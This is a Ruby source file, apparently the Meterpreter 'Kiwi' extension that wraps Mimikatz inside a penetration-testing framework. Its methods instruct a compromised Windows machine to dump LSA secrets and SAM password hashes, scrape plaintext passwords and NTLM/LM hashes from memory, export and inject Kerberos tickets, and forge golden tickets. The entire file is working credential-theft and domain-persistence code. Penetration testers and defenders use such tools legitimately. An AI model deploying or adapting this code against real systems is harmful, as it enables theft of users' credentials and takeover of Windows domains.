# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/kiwi/tlv'
require 'csv'

module Rex
module Post
module Meterpreter
module Extensions
module Kiwi

###
#
# Kiwi extension - grabs credentials from windows memory.
#
# Benjamin DELPY `gentilkiwi`
# http://blog.gentilkiwi.com/mimikatz
#
# extension converted by OJ Reeves (TheColonial)
###

class Kiwi < Extension

  #
  # These are constants that identify the type of credential to dump
  # from the target machine.
  #
  PWD_ID_SEK_ALLPASS   = 0
  PWD_ID_SEK_WDIGEST   = 1
  PWD_ID_SEK_MSV       = 2
  PWD_ID_SEK_KERBEROS  = 3
  PWD_ID_SEK_TSPKG     = 4
  PWD_ID_SEK_LIVESSP   = 5
  PWD_ID_SEK_SSP       = 6
  PWD_ID_SEK_DPAPI     = 7

  #
  # List of names which represent the flags that are part of the
  # dumped kerberos tickets. The order of these is important. Each
  # of them was pulled from the Mimikatz 2.0 source base.
  #
  @@kerberos_flags = [
    "NAME CANONICALIZE",
    "<unknown>",
    "OK AS DELEGATE",
    "<unknown>",
    "HW AUTHENT",
    "PRE AUTHENT",
    "INITIAL",
    "RENEWABLE",
    "INVALID",
    "POSTDATED",
    "MAY POSTDATE",
    "PROXY",
    "PROXIABLE",
    "FORWARDED",
    "FORWARDABLE",
    "RESERVED"
  ]

  #
  # Typical extension initialization routine.
  #
  def initialize(client)
    super(client, 'kiwi')

    client.register_extension_aliases(
      [
        {
          'name' => 'kiwi',
          'ext'  => self
        },
      ])
  end

  #
  # Dump the LSA secrets from the target machine.
  #
  # Returns [Hash]
  #
  def lsa_dump
    request = Packet.create_request('kiwi_lsa_dump_secrets')

    response = client.send_request(request)

    result = {
      :major    => response.get_tlv_value(TLV_TYPE_KIWI_LSA_VER_MAJ),
      :minor    => response.get_tlv_value(TLV_TYPE_KIWI_LSA_VER_MIN),
      :compname => response.get_tlv_value(TLV_TYPE_KIWI_LSA_COMPNAME),
      :syskey   => to_hex_string(response.get_tlv_value(TLV_TYPE_KIWI_LSA_SYSKEY)),
      :nt5key   => to_hex_string(response.get_tlv_value(TLV_TYPE_KIWI_LSA_NT5KEY)),
      :nt6keys  => [],
      :secrets  => [],
      :samkeys  => []
    }

    response.each(TLV_TYPE_KIWI_LSA_NT6KEY) do |k|
      result[:nt6keys] << {
        :id    => to_guid(k.get_tlv_value(TLV_TYPE_KIWI_LSA_KEYID)),
        :value => to_hex_string(k.get_tlv_value(TLV_TYPE_KIWI_LSA_KEYVALUE))
      }
    end

    response.each(TLV_TYPE_KIWI_LSA_SECRET) do |s|
      r = {
        :name    => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_NAME),
        :service => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_SERV),
        :ntlm    => to_hex_string(s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_NTLM)),
        :current => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_CURR),
        :old     => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_OLD)
      }

      r[:current] ||= to_hex_dump(s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_CURR_RAW))
      r[:old]     ||= to_hex_dump(s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_OLD_RAW))

      result[:secrets] << r
    end

    response.each(TLV_TYPE_KIWI_LSA_SAM) do |s|
      result[:samkeys] << {
        :rid       => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_RID),
        :user      => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_USER),
        :ntlm_hash => to_hex_string(s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_NTLMHASH)),
        :lm_hash   => to_hex_string(s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_LMHASH))
      }
    end

    result
  end

  #
  # Convert a flag set to a list of string representations for the bit flags
  # that are set.
  #
  # +flags+ [Integer] - Integer bitmask of Kerberos token flags.
  #
  # Returns [String]
  #
  def to_kerberos_flag_list(flags)
    flags = flags >> 16
    results = []

    @@kerberos_flags.each_with_index do |item, idx|
      mask = 1 << idx

      if (flags & (1 << idx)) != 0
        results  << item
      end
    end

    results
  end

  #
  # List available kerberos tickets.
  #
  # +export+ [Bool] - Set to +true+ to export the content of each ticket
  #
  # Returns [Array[Hash]]
  #
  def kerberos_ticket_list(export)
    export ||= false
    request = Packet.create_request('kiwi_kerberos_ticket_list')
    request.add_tlv(TLV_TYPE_KIWI_KERB_EXPORT, export)
    response = client.send_request(request)

    results = []

    response.each(TLV_TYPE_KIWI_KERB_TKT) do |t|
      results << {
        :enc_type     => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_ENCTYPE),
        :start        => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_START),
        :end          => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_END),
        :max_renew    => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_MAXRENEW),
        :server       => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_SERVERNAME),
        :server_realm => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_SERVERREALM),
        :client       => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_CLIENTNAME),
        :client_realm => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_CLIENTREALM),
        :flags        => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_FLAGS),
        :raw          => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_RAW)
      }
    end

    results
  end

  #
  # Use the given ticket in the current session.
  #
  # +ticket+ [Array[Byte]] - Content of the Kerberos ticket to use.
  #
  # Returns [Bool]
  #
  def kerberos_ticket_use(ticket)
    request = Packet.create_request('kiwi_kerberos_ticket_use')
    request.add_tlv(TLV_TYPE_KIWI_KERB_TKT_RAW, ticket, false, true)
    client.send_request(request)
    return true
  end

  #
  # Purge any Kerberos tickets that have been added to the current session.
  #
  # Returns [Bool]
  #
  def kerberos_ticket_purge
    request = Packet.create_request('kiwi_kerberos_ticket_purge')
    client.send_request(request)
    return true
  end

  #
  # Create a new golden kerberos ticket on the target machine and return it.
  #
  # +user+ [String] - Name of the user to create the ticket for.
  # +domain+ [String] - Domain name.
  # +sid+ [String] - SID of the domain.
  # +tgt+ [String] - The kerberos ticket granting token.
  #
  # Returns [Array[Byte]]
  #
  def golden_ticket_create(user, domain, sid, tgt)
    request = Packet.create_request('kiwi_kerberos_golden_ticket_create')
    request.add_tlv(TLV_TYPE_KIWI_GOLD_USER, user)
    request.add_tlv(TLV_TYPE_KIWI_GOLD_DOMAIN, domain)
    request.add_tlv(TLV_TYPE_KIWI_GOLD_SID, sid)
    request.add_tlv(TLV_TYPE_KIWI_GOLD_TGT, tgt)

    response = client.send_request(request)

    return response.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_RAW)
  end

  #
  # Scrape passwords from the target machine.
  #
  # +pwd_id+ - ID of the type credential to scrape.
  #
  # Returns [Array[Hash]]
  #
  def scrape_passwords(pwd_id)
    request = Packet.create_request('kiwi_scrape_passwords')
    request.add_tlv(TLV_TYPE_KIWI_PWD_ID, pwd_id)
    response = client.send_request(request)

    results = []
    response.each(TLV_TYPE_KIWI_PWD_RESULT) do |r|
      results << {
        :username => r.get_tlv_value(TLV_TYPE_KIWI_PWD_USERNAME),
        :domain   => r.get_tlv_value(TLV_TYPE_KIWI_PWD_DOMAIN),
        :password => r.get_tlv_value(TLV_TYPE_KIWI_PWD_PASSWORD),
        :auth_hi  => r.get_tlv_value(TLV_TYPE_KIWI_PWD_AUTH_HI),
        :auth_lo  => r.get_tlv_value(TLV_TYPE_KIWI_PWD_AUTH_LO),
        :lm       => to_hex_string(r.get_tlv_value(TLV_TYPE_KIWI_PWD_LMHASH)),
        :ntlm     => to_hex_string(r.get_tlv_value(TLV_TYPE_KIWI_PWD_NTLMHASH))
      }
    end

    return results
  end

  #
  # Scrape all passwords from the target machine.
  #
  # Returns [Array[Hash]]
  #
  def all_pass
    scrape_passwords(PWD_ID_SEK_ALLPASS)
  end

  #
  # Scrape wdigest credentials from the target machine.
  #
  # Returns [Array[Hash]]
  #
  def wdigest
    scrape_passwords(PWD_ID_SEK_WDIGEST)
  end

  #
  # Scrape msv credentials from the target machine.
  #
  # Returns [Array[Hash]]
  #
  def msv
    scrape_passwords(PWD_ID_SEK_MSV)
  end

  #
  # Scrape LiveSSP credentials from the target machine.
  #
  # Returns [Array[Hash]]
  #
  def livessp
    scrape_passwords(PWD_ID_SEK_LIVESSP)
  end

  #
  # Scrape SSP credentials from the target machine.
  #
  # Returns [Array[Hash]]
  #
  def ssp
    scrape_passwords(PWD_ID_SEK_SSP)
  end

  #
  # Scrape TSPKG credentials from the target machine.
  #
  # Returns [Array[Hash]]
  #
  def tspkg
    scrape_passwords(PWD_ID_SEK_TSPKG)
  end

  #
  # Scrape Kerberos credentials from the target machine.
  #
  # Returns [Array[Hash]]
  #
  def kerberos
    scrape_passwords(PWD_ID_SEK_KERBEROS)
  end

protected

  #
  # Convert an array of bytes to a string-based hex dump in the format
  #   AA BB CC DD EE FF
  #
  # +bytes+ [Array[Byte]] - Array of bytes to convert.
  #
  # Returns [String].
  #
  def to_hex_dump(bytes)
    return nil unless bytes

    bytes.each_byte.map { |b|
      b.to_s(16).rjust(2, '0')
    }.join(' ')
  end

  #
  # Convert an array of bytes to a hex string without spaces
  #   AABBCCDDEEFF
  #
  # +bytes+ [Array[Byte]] - Array of bytes to convert.
  #
  # Returns [String].
  #
  def to_hex_string(bytes)
    return nil unless bytes
    bytes.unpack('H*')[0]
  end

  #
  # Convert an array of bytes to a GUID string
  #
  # +bytes+ Array of bytes to convert.
  #
  # Returns [String].
  #
  def to_guid(bytes)
    return nil unless bytes
    s = bytes.unpack('H*')[0]
    parts = [
      s[6,  2] + s[4,  2] + s[2, 2] + s[0, 2],
      s[10, 2] + s[8,  2],
      s[14, 2] + s[12, 2],
      s[16, 4],
      s[20, 12]
    ]
    "{#{parts.join('-')}}"
  end
end

end; end; end; end; end

